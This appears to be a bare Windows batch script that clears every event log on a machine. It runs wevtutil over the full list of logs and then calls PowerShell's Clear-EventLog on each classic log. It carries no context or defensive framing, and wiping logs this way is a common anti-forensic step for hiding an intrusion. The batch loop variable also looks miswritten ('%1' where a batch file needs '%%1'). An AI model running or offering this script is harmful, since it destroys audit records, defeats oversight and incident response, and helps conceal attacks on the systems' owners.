@echo off
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
powershell -Command "Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }"

